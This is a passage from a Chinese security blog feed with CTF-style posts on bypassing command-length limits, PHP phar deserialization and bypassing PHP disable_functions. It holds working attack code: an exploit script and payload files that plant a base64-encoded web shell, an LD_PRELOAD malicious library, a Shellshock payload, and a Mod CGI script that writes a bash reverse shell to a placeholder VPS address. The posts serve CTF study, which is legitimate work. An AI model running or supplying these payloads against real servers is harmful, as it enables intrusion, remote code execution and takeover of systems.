\\</span><br><span class="line">&gt;64\\</span><br><span class="line">&gt;se\\</span><br><span class="line">&gt;ba\\</span><br><span class="line">&gt;\|\\</span><br><span class="line">&gt;7\\</span><br><span class="line">&gt;Sk\\</span><br><span class="line">&gt;X\\</span><br><span class="line">&gt;x\\</span><br><span class="line">&gt;Fs\\</span><br><span class="line">&gt;FV\\</span><br><span class="line">&gt;d\\</span><br><span class="line">&gt;X0\\ </span><br><span class="line">&gt;k\\</span><br><span class="line">&gt;g\\</span><br><span class="line">&gt;bC\\</span><br><span class="line">&gt;h\\</span><br><span class="line">&gt;XZ\\</span><br><span class="line">&gt;gZ\\</span><br><span class="line">&gt;A\\</span><br><span class="line">&gt;aH\\</span><br><span class="line">&gt;w\\</span><br><span class="line">&gt;D9\\ </span><br><span class="line">&gt;P\\</span><br><span class="line">&gt;S&#125;\\</span><br><span class="line">&gt;IF\\</span><br><span class="line">&gt;&#123;\\</span><br><span class="line">&gt;\$\\</span><br><span class="line">&gt;o\\</span><br><span class="line">&gt;ch\\</span><br><span class="line">&gt;e\\</span><br><span class="line">sh a</span><br><span class="line">sh f</span><br></pre></td></tr></table></figure><p>exp.py</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"> </span><br><span class="line">target_url=<span class="string">"http://192.168.1.101"</span></span><br><span class="line">url = target_url+<span class="string">"/command.php?cmd=&#123;&#125;"</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">"[+]start attack!!!"</span>)</span><br><span class="line">with open(<span class="string">"payload.txt"</span>,<span class="string">"r"</span>,encoding=<span class="string">"utf-8"</span>) as f:</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> f:</span><br><span class="line"><span class="built_in">print</span>(<span class="string">"[*]"</span> + url.format(i.strip()))</span><br><span class="line">requests.get(url.format(i.strip()))</span><br><span class="line"><span class="built_in">test</span> = requests.get(target_url+<span class="string">"/sandbox/fec93fd8e80b1dce1c81d832dc43fa40/1.php"</span>)</span><br><span class="line"><span class="keyword">if</span> test.status_code == requests.codes.ok:</span><br><span class="line"><span class="built_in">print</span>(<span class="string">"[*]Attack success!!!"</span>)</span><br></pre></td></tr></table></figure><p>在本地实验中用sh失败了，用bash成功，不知道啥原因<br><img src="../../images/loopholes/command/1.png" alt=""></p><h1 id="四位可控字符"><a href="#四位可控字符" class="headerlink" title="四位可控字符"></a>四位可控字符</h1><p>与之前的5位是一样的，经测试构造的payload.txt内容去掉了一个\也可以成功输出1.php<br>payload.txt</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">&gt;dir</span><br><span class="line">&gt;f\&gt;</span><br><span class="line">&gt;ht-</span><br><span class="line">&gt;sl</span><br><span class="line">*&gt;v</span><br><span class="line">&gt;rev</span><br><span class="line">*v&gt;a</span><br><span class="line">&gt;hp</span><br><span class="line">&gt;p\</span><br><span class="line">&gt;1.\</span><br><span class="line">&gt;\&gt;\</span><br><span class="line">&gt;-d\</span><br><span class="line">&gt;\ \</span><br><span class="line">&gt;64\</span><br><span class="line">&gt;se\</span><br><span class="line">&gt;ba\</span><br><span class="line">&gt;\|\</span><br><span class="line">&gt;7\</span><br><span class="line">&gt;Sk\</span><br><span class="line">&gt;X\</span><br><span class="line">&gt;x\</span><br><span class="line">&gt;Fs\</span><br><span class="line">&gt;FV\</span><br><span class="line">&gt;d\</span><br><span class="line">&gt;X0\</span><br><span class="line">&gt;k\</span><br><span class="line">&gt;g\</span><br><span class="line">&gt;bC\</span><br><span class="line">&gt;h\</span><br><span class="line">&gt;XZ\</span><br><span class="line">&gt;gZ\</span><br><span class="line">&gt;A\</span><br><span class="line">&gt;aH\</span><br><span class="line">&gt;w\</span><br><span class="line">&gt;D9\</span><br><span class="line">&gt;P\\</span><br><span class="line">&gt;S&#125;\</span><br><span class="line">&gt;IF\</span><br><span class="line">&gt;&#123;\</span><br><span class="line">&gt;\$\</span><br><span class="line">&gt;o\</span><br><span class="line">&gt;ch\</span><br><span class="line">&gt;e\</span><br><span class="line">sh a</span><br><span class="line">sh f</span><br></pre></td></tr></table></figure><h1 id="三位可控字符"><a href="#三位可控字符" class="headerlink" title="三位可控字符"></a>三位可控字符</h1><p>来自CTFSHOW平台的【nl】难了 一题 </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(strlen($_GET[<span class="number">1</span>])&lt;<span class="number">4</span>)&#123;</span><br><span class="line">     <span class="keyword">echo</span> shell_exec($_GET[<span class="number">1</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">     <span class="keyword">echo</span> <span class="string">"hack!!!"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>只存在s开头的和z开头的文件，Linux中文件排序按照26个英文字母顺序排放，所以我们依然利用前几种字符限制的方法，通过&gt;写入一个以命令名命名的文件，如:nl（读取文件带上行）od（八进制显示输出），但这样的命令前提是其第一个字母必须在当前文件名中排到第一位。</p><p>payload:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?1=&gt;nl ?1=*或?1=*&gt;z </span><br><span class="line">?1=&gt;od ?1=*</span><br></pre></td></tr></table></figure><p>上图是传入nl后ls当前目录下的内容，接下来再传入<code>?=*</code>的时候就会在源代码中得到flag。<br>参考文章：</p><p><a href="http://purplet.top/2020/12/28/%E6%9C%89%E9%99%90%E5%AD%97%E7%AC%A6%E4%B8%8B%E7%9A%84%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%80%BB%E7%BB%93/" target="_blank" rel="noopener">CTF相关知识点<br>有限字符下的任意命令执行总结</a></p><p><a href="https://www.anquanke.com/post/id/87203" target="_blank" rel="noopener">【CTF 攻略】如何绕过四个字符限制getshell</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;命令执行的字符限制绕过  &lt;/p&gt;
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>phar反序列化学习</title>
    <link href="https://blog.cfyqy.com/article/a8d2a8d3.html"/>
    <id>https://blog.cfyqy.com/article/a8d2a8d3.html</id>
    <published>2020-12-28T15:28:03.000Z</published>
    <updated>2021-01-05T02:58:44.711Z</updated>
    
    <content type="html"><![CDATA[<p>phar反序列化就是可以在不使用php函数unserialize()的前提下，进行反序列化，从而引起的严重的php对象注入漏洞。  </p><a id="more"></a><h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><h2 id="phar文件结构"><a href="#phar文件结构" class="headerlink" title="phar文件结构"></a>phar文件结构</h2><p>四部分构成</p><ul><li>stub：phar文件标识，前面内容不限，但必须以    <code>__HALT_COMPILER();?&gt;</code>来结尾，否则phar扩展将无法识别这个文件为phar文件</li><li>manifest：压缩文件的属性等信息，以序列化的形式存储自定义的meta-data。</li><li>contents：压缩文件的内容</li><li>signature：签名，在文件末尾</li></ul><h2 id="缘由"><a href="#缘由" class="headerlink" title="缘由"></a>缘由</h2><p>漏洞触发点在使用phar://协议读取文件的时候，文件内容会被解析成phar对象，然后phar对象内的Metadata信息会被反序列化。当内核调用phar_parse_metadata()解析metadata数据时，会调用php_var_unserialize()对其进行反序列化操作，因此会造成反序列化漏洞。<br><img src="../../images/php/phar/1.png" alt=""></p><h1 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h1><h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><p>利用条件:</p><ul><li>phar文件要能够上传到服务器端。</li><li>要有可用的魔术方法作为“跳板”。</li><li>文件操作函数的参数可控，且:、/、phar等特殊字符没有被过滤。</li></ul><p>有序列化数据必然会有反序列化操作，php一大部分的文件系统函数在通过phar://伪协议解析phar文件时，都会将meta-data进行反序列化，测试后受影响的函数如下：</p><p><img src="../../images/php/phar/2.png" alt=""></p><h2 id="生成文件"><a href="#生成文件" class="headerlink" title="生成文件"></a>生成文件</h2><p>根据文件结构我们来自己构建一个 phar 文件，php内置了一个 Phar 类来处理相关操作</p><p>注意：要将 php.ini 中的 phar.readonly 选项设置为Off，否则无法生成 phar 文件。</p><p>phar.php:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">TestObject</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">    $phar = <span class="keyword">new</span> Phar(<span class="string">"phar.phar"</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line">    $phar-&gt;startBuffering();</span><br><span class="line">    $phar-&gt;setStub(<span class="string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span>); <span class="comment">//设置stub</span></span><br><span class="line">    $o = <span class="keyword">new</span> TestObject();</span><br><span class="line">    $o -&gt; data=<span class="string">'hu3sky'</span>;</span><br><span class="line">    $phar-&gt;setMetadata($o); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line">    $phar-&gt;addFromString(<span class="string">"test.txt"</span>, <span class="string">"test"</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line">    <span class="comment">//签名自动计算</span></span><br><span class="line">    $phar-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>生成phar.phar文件<br><img src="../../images/php/phar/1.jpg" alt=""></p><p>可以明显的看到meta-data是以序列化的形式存储的。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">TestObject</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @unlink(<span class="string">"phar.phar"</span>);</span><br><span class="line">    $phar = <span class="keyword">new</span> Phar(<span class="string">"phar.phar"</span>);</span><br><span class="line">    $phar-&gt;startBuffering();</span><br><span class="line">    $phar-&gt;setStub(<span class="string">"GIF89a"</span>.<span class="string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span>); <span class="comment">//设置stub，增加gif文件头</span></span><br><span class="line">    $o = <span class="keyword">new</span> TestObject();</span><br><span class="line">    $phar-&gt;setMetadata($o); <span class="comment">//将自定义meta-data存入manifest</span></span><br><span class="line">    $phar-&gt;addFromString(<span class="string">"test.txt"</span>, <span class="string">"test"</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line">    <span class="comment">//签名自动计算</span></span><br><span class="line">    $phar-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以看到加了GIF89a文件头，从而使其伪装成gif文件：<br><img src="../../images/php/phar/3.png" alt=""><br>生成文件后，可以修改为任意后缀。 </p><h1 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h1><p>参考文章：</p><p>Phar反序列化浅析：<a href="https://www.extrader.top/posts/bb56c28a/" target="_blank" rel="noopener">https://www.extrader.top/posts/bb56c28a/</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;phar反序列化就是可以在不使用php函数unserialize()的前提下，进行反序列化，从而引起的严重的php对象注入漏洞。  &lt;/p&gt;
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>Bypasss Disable_function </title>
    <link href="https://blog.cfyqy.com/article/6124293c.html"/>
    <id>https://blog.cfyqy.com/article/6124293c.html</id>
    <published>2020-12-27T03:19:00.000Z</published>
    <updated>2021-01-05T02:53:25.071Z</updated>
    
    <content type="html"><![CDATA[<p>PHP 的 disable_functions 用于禁用一些危险的函数避免被攻击者利用  </p><a id="more"></a><p>disable_function专题： <a href="https://github.com/AntSwordProject/AntSword-Labs/tree/master/bypass_disable_functions" target="_blank" rel="noopener">https://github.com/AntSwordProject/AntSword-Labs/tree/master/bypass_disable_functions</a>  </p><h1 id="寻找非过滤函数"><a href="#寻找非过滤函数" class="headerlink" title="寻找非过滤函数"></a>寻找非过滤函数</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">function=<span class="string">"pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,dl,mail,system,putenv"</span></span><br><span class="line">disable_function=<span class="string">"eee,tdd"</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> disable_function.split(<span class="string">","</span>):</span><br><span class="line"><span class="keyword">if</span> i <span class="keyword">not</span> <span class="keyword">in</span> function:</span><br><span class="line">print(i)</span><br></pre></td></tr></table></figure><h1 id="LD-PRELOAD"><a href="#LD-PRELOAD" class="headerlink" title="LD_PRELOAD"></a>LD_PRELOAD</h1><blockquote><p>LD_PRELOAD是Linux系统的一个环境变量，它可以影响程序的运行时的链接（Runtime linker），它允许你定义在程序运行前优先加载的动态链接库。这个功能主要就是用来有选择性的载入不同动态链接库中的相同函数。通过这个环境变量，我们可以在主程序和其动态链接库的中间加载别的动态链接库，甚至覆盖正常的函数库。一方面，我们可以以此功能来使用自己的或是更好的函数（无需别人的源码），而另一方面，我们也可以以向别人的程序注入程序，从而达到特定的目的。  </p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">putenv()：PHP函数，可以设置环境变量</span><br><span class="line">mail()，error_log():PHP函数，在运行时会执行系统中的程序：sendmail</span><br></pre></td></tr></table></figure><p>大致步骤：</p><ul><li>生成一个我们的恶意动态链接库文件</li><li>利用putenv设置LD_PRELOAD为我们的恶意动态链接库文件的路径</li><li>配合php的某个函数去触发我们的恶意动态链接库文件</li><li>RCE并获取flag</li></ul><p>getflag.c</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include &lt;stdlib.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;string.h&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">__attribute__ ((__constructor__)) void angel (void)&#123;</span><br><span class="line">    unsetenv(<span class="string">"LD_PRELOAD"</span>);</span><br><span class="line">    system(<span class="string">"/readflag &gt; /tmp/flag.txt"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译成getflag.so</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -shared -fPIC getflag.c -o getflag.so</span><br></pre></td></tr></table></figure><p>上传到tmp目录下，</p><p>在网站根目录创建shell.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?Php</span></span><br><span class="line">putenv(<span class="string">"LD_PRELOAD=/tmp/getflag.so"</span>);</span><br><span class="line">mail(<span class="string">""</span>, <span class="string">""</span>, <span class="string">""</span>, <span class="string">""</span>);</span><br><span class="line">error_log(<span class="string">""</span>,<span class="number">1</span>,<span class="string">""</span>,<span class="string">""</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>然后去GET请求包含shell.php url/?ant=include(%27shell.php%27);<br>在tmp目录上生成flag.txt，包含flag，蚁剑记得重新刷新一下目录</p><h1 id="ShellShock"><a href="#ShellShock" class="headerlink" title="ShellShock"></a>ShellShock</h1><p>ShellShock,破壳漏洞，出现于2014年<br>利用bash破壳漏洞（CVE-2014-6271），该漏洞存在于bash 1.14 – 4.3版本中<br><a href="https://www.cnblogs.com/qmfsun/p/7591757.html" target="_blank" rel="noopener">https://www.cnblogs.com/qmfsun/p/7591757.html</a><br>可以通过以下命令来判断是否存在这个漏洞</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">env x=<span class="string">'() &#123; :;&#125;; echo vulnerable'</span> bash -c <span class="string">"echo this is a test"</span></span><br></pre></td></tr></table></figure><p>如果结果中有 vulnerable说明存在这个漏洞，执行了echo vulnerable这个语句。<br>大致原理：<br>bash shell中定义环境变量通过函数名称来调用时，正常情况下是这样<br>在这里插入图片描述<br><img src="../../images/ctf/ctfhub/1.png" alt=""><br>但是对于存在shellshock漏洞的环境下，Bash对于环境变量只是检测到函数，并且从’{‘开始执行，但是并没有在’}’后停止，也就是说定义在函数体外shell命令也会执行，所以<code>env x=&#39;() { :;}; echo vulnerable&#39;</code> 输出了vulnerable。</p><p>例题：<br>查看phpinfo() 和上题一样还是没有禁用error_log函数。正常情况下蚁剑已经实现通过ShellShock漏洞，直接拿到shell，但是这题不行。<br>上传shell.php，并访问</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  @<span class="keyword">eval</span>($_REQUEST[<span class="string">'ant'</span>]);</span><br><span class="line">  putenv(<span class="string">"PHP_test=() &#123; :; &#125;; tac /flag &gt;&gt; /var/www/html/flag.txt"</span>);</span><br><span class="line">  error_log(<span class="string">"admin"</span>,<span class="number">1</span>);</span><br><span class="line">  <span class="comment">//mail("admin@localhost","","","","");</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>通过putenv来设置环境变量，默认putenv定义的环境变量名必须以<code>PHP_</code>开头。<br>error_log()函数会在执行<code>sh -c -t -i</code>触发payload</p><h1 id="Apache-Mod-CGI"><a href="#Apache-Mod-CGI" class="headerlink" title="Apache Mod CGI"></a>Apache Mod CGI</h1><p>需要满足几个条件:</p><ul><li>必须是apache环境</li><li>mod_cgi已经启用</li><li>必须允许.htaccess文件，也就是说在httpd.conf中，要注意AllowOverride选项为All，而不是none</li><li>必须有权限写.htaccess文件</li></ul><p>例：<br>.htaccess内容：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Options +ExecCGI</span><br><span class="line">AddHandler cgi-script .<span class="built_in">test</span><span class="comment">#表示.stest后缀的文件都会被当作cgi脚本执行</span></span><br></pre></td></tr></table></figure><p>shell.test</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="built_in">echo</span> -ne <span class="string">"Content-Type: text/html\n\n"</span></span><br><span class="line"><span class="built_in">echo</span>&amp;ls</span><br></pre></td></tr></table></figure><p>这里没尝试成功,猜测要给shell.test给777权限</p><p>注解：</p><blockquote><p>Options指令是Apache配置文件中一个比较常见也比较重要的指令，Options指令可以在Apache服务器核心配置(server config)、虚拟主机配置(virtual host)、特定目录配置(directory)以及.htaccess文件中使用。Options指令的主要作用是控制特定目录将启用哪些服务器特性。<br>关于Options指令后可以附加的特性选项的具体作用及含义，可以参考这篇文章：<a href="http://www.365mini.com/page/apache-options-directive.htm" target="_blank" rel="noopener">http://www.365mini.com/page/apache-options-directive.htm</a><br>当然我们用到的就是ExecCGI选项，表示允许使用mod_cgi模块执行CGI脚本</p></blockquote><p>上传shell.php，vps监听端口，访问shell.php,反弹shell</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$cmd = <span class="string">"bash -i &gt;&amp; /dev/tcp/vpsip/port 0&gt;&amp;1"</span>; <span class="comment">//command to be executed</span></span><br><span class="line">$shellfile = <span class="string">"#!/bin/bash\n"</span>; <span class="comment">//using a shellscript</span></span><br><span class="line">$shellfile .= <span class="string">"echo -ne \"Content-Type: text/html\\n\\n\"\n"</span>; <span class="comment">//header is needed, otherwise a 500 error is thrown when there is output</span></span><br><span class="line">$shellfile .= <span class="string">"$cmd"</span>; <span class="comment">//executing $cmd</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkEnabled</span><span class="params">($text,$condition,$yes,$no)</span> //<span class="title">this</span> <span class="title">surely</span> <span class="title">can</span> <span class="title">be</span> <span class="title">shorter</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"$text: "</span> . ($condition ? $yes : $no) . <span class="string">"&lt;br&gt;\n"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_GET[<span class="string">'checked'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    @file_put_contents(<span class="string">'.htaccess'</span>, <span class="string">"\nSetEnv HTACCESS on"</span>, FILE_APPEND); <span class="comment">//Append it to a .htaccess file to see whether .htaccess is allowed</span></span><br><span class="line">    header(<span class="string">'Location: '</span> . $_SERVER[<span class="string">'PHP_SELF'</span>] . <span class="string">'?checked=true'</span>); <span class="comment">//execute the script again to see if the htaccess test worked</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    $modcgi = in_array(<span class="string">'mod_cgi'</span>, apache_get_modules()); <span class="comment">// mod_cgi enabled?</span></span><br><span class="line">    $writable = is_writable(<span class="string">'.'</span>); <span class="comment">//current dir writable?</span></span><br><span class="line">    $htaccess = !<span class="keyword">empty</span>($_SERVER[<span class="string">'HTACCESS'</span>]); <span class="comment">//htaccess enabled?</span></span><br><span class="line">        checkEnabled(<span class="string">"Mod-Cgi enabled"</span>,$modcgi,<span class="string">"Yes"</span>,<span class="string">"No"</span>);</span><br><span class="line">        checkEnabled(<span class="string">"Is writable"</span>,$writable,<span class="string">"Yes"</span>,<span class="string">"No"</span>);</span><br><span class="line">        checkEnabled(<span class="string">"htaccess working"</span>,$htaccess,<span class="string">"Yes"</span>,<span class="string">"No"</span>);</span><br><span class="line">    <span class="keyword">if</span>(!($modcgi &amp;&amp; $writable &amp;&amp; $htaccess))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Error. All of the above must be true for the script to work!"</span>; <span class="comment">//abort if not</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        checkEnabled(<span class="string">"Backing up .htaccess"</span>,copy(<span class="string">".htaccess"</span>,<span class="string">".htaccess.bak"</span>),<span class="string">"Suceeded! Saved in .htaccess.bak"</span>,<span class="string">"Failed!"</span>); <span class="comment">//make a backup, cause you never know.</span></span><br><span class="line">        checkEnabled(<span class="string">"Write .htaccess file"</span>,file_put_contents(<span class="string">'.htaccess'</span>,<span class="string">"Options +ExecCGI\nAddHandler cgi-script .dizzle"</span>),<span class="string">"Succeeded!"</span>,<span class="string">"Failed!"</span>); <span class="comment">//.dizzle is a nice extension</span></span><br><span class="line">        checkEnabled(<span class="string">"Write shell file"</span>,file_put_contents(<span class="string">'shell.dizzle'</span>,$shellfile),<span class="string">"Succeeded!"</span>,<span class="string">"Failed!"</span>); <span class="comment">//write the file</span></span><br><span class="line">        checkEnabled(<span class="string">"Chmod 777"</span>,chmod(<span class="string">"shell.dizzle"</span>,<span class="number">0777</span>),<span class="string">"Succeeded!"</span>,<span class="string">"Failed!"</span>); <span class="comment">//rwx</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Executing the script now. Check your listener &lt;img src = 'shell.dizzle' style = 'display:none;'&gt;"</span>; <span class="comment">//call the script</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h1 id="PHP-FPM"><a href="#PHP-FPM" class="headerlink" title="PHP-FPM"></a>PHP-FPM</h1><p>详情可看此篇文章：<a href="https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html</a> </p><p>可用蚁剑 disable_functions 插件绕过<br><img src="../../images/ctf/ctfhub/2.jpg" alt=""><br>会生成 .antproxy.php 文件，密码ant<br><img src="../../images/ctf/ctfhub/3.jpg" alt=""><br>连接 .antproxy.php 文件<br><img src="../../images/ctf/ctfhub/4.jpg" alt=""></p><h1 id="GC-UAF"><a href="#GC-UAF" class="headerlink" title="GC UAF"></a>GC UAF</h1><p>利用的是PHP garbage collector程序中的堆溢出触发，影响范围为7.0-1.3  </p><p>使用条件：<br>Linux 操作系统<br>PHP 版本<br>7.0 - all versions to date<br>7.1 - all versions to date<br>7.2 - all versions to date<br>7.3 - all versions to date   </p><p>exp:<a href="https://github.com/mm0r1/exploits/tree/master/php7-gc-bypass" target="_blank" rel="noopener">https://github.com/mm0r1/exploits/tree/master/php7-gc-bypass</a><br>或者直接蚁剑<br><img src="../../images/ctf/ctfhub/5.jpg" alt=""></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span 